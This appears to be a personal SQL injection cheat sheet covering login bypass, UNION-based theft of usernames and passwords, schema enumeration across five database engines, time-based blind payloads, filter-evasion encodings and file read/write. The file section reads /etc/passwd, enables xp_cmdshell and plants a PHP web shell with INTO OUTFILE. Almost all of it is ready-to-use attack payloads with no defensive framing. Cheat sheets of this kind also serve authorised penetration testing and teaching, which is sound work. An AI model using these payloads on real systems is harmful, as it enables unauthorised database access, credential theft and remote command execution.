## test payloads
```sql
'
"
'
OR 1=1-- -
" OR "1"="1
' OR 'a'='a
')
")
```
#### numeric inputs
```sql
1' OR '1'='1
0 OR 1=1

```
## login bypass

```sql
admin'--
admin'#
admin'/*
' OR '1'='1'--
' OR 1=1-- 
") OR ("1"="1
' OR 'x'='x
```
make sure to firstly think what kinda logic is even present for boolean bypass


## union tpye shit

```sql
' ORDER BY 1--
' ORDER BY 2--
...
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL--
...

```
data extraction using union:
```sql
' UNION SELECT null,username,password FROM users--
' UNION SELECT null,database(),version()--

```

## table and db enumeration using union:

#### mysql
```sql
-- List databases
SELECT schema_name FROM information_schema.schemata;

-- List tables in a DB
SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbname';

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

```

#### postgresql
```sql
-- List databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

```
#### mssql
```sql
-- List databases
SELECT name FROM master..sysdatabases;

-- List tables
SELECT name FROM dbname..sysobjects WHERE xtype = 'U';

-- List columns
SELECT name FROM syscolumns WHERE id = OBJECT_ID('users');

```

#### oracle
```sql
-- List tables (current user)
SELECT table_name FROM user_tables;

-- List all tables (if permissions)
SELECT table_name FROM all_tables;

-- List columns
SELECT column_name FROM user_tab_columns WHERE table_name = 'USERS';

```

#### sqlite
```sql
-- List tables
SELECT name FROM sqlite_master WHERE type='table';

-- List columns (via schema)
SELECT sql FROM sqlite_master WHERE name='users';

```

## version shitting

```sql
-- MySQL
SELECT @@version;                    -- Version
SELECT @@version_comment;            -- Server info
SELECT USER();                       -- Current user
SELECT DATABASE();                   -- Current DB

-- PostgreSQL
SELECT version();                    -- Full version & OS
SELECT current_database();           -- Current DB
SELECT current_user;                 -- Current user

-- MSSQL
SELECT @@version;                    -- Version & build
SELECT DB_NAME();                    -- Current DB
SELECT SYSTEM_USER;                  -- Current user

-- Oracle
SELECT * FROM v$version;             -- Version info
SELECT banner FROM v$version;        -- Version banner
SELECT SYS_CONTEXT('userenv','current_user') FROM dual; -- User
SELECT SYS_CONTEXT('userenv','db_name') FROM dual;      -- DB name

-- SQLite
SELECT sqlite_version();             -- Version
-- No built-in DB name; usually derived from file name
-- User context not applicable in typical setups   

```

## time based shit

```sql
-- MySQL
AND SLEEP(5)--
AND IF(1=1, SLEEP(5), 0)--
AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- PostgreSQL
AND pg_sleep(5)--
AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
AND WAITFOR DELAY '0:0:5'--
IF(1=1) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'--

-- Oracle
AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('A',5) ELSE 0 END FROM DUAL)=0--
AND (SELECT CASE WHEN (1=1) THEN UTL_HTTP.REQUEST('http://x'||DBMS_PIPE.RECEIVE_MESSAGE('A',5)) ELSE 0 END FROM DUAL) IS NOT NULL--

-- SQLite
AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))))--
AND CASE WHEN (1=1) THEN LIKE('ABCDEFG',HEX(RANDOMBLOB(1000000))) ELSE 0 END--   

```


## file read / write
```sql
-- MySQL (read)
LOAD_FILE('/etc/passwd')

-- MySQL (write)
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/shell.php'

-- PostgreSQL (read)
SELECT pg_read_file('/etc/passwd', 0, 1000)

-- PostgreSQL (write)
SELECT lo_export(pg_lo_import('/etc/passwd'), '/tmp/pwned')

-- MSSQL (read)
SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS Contents

-- MSSQL (enable xp_cmdshell)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;   

```

## context specific shitting
```sql
-- Inside INSERT
', ('malicious', 'value'))-- 

-- Inside UPDATE
', column=(SELECT password FROM users WHERE '1'='1')) WHERE id=1--

-- JSON context
' OR 1=1)--} OR {'a':'a

```




## waf bypasses
```sql
-- Case variation
uNiOn sElEcT 1,2--

-- Comment injection
UNI/**/ON SEL/**/ECT 1,2--

-- URL encoding
%27%20UNION%20SELECT%201,2--

-- Hex encoding
0x554e494f4e2053454c45435420312c32

-- String concatenation
' || 'abc'--        -- Oracle, PostgreSQL
' + 'abc'--          -- MSSQL

```


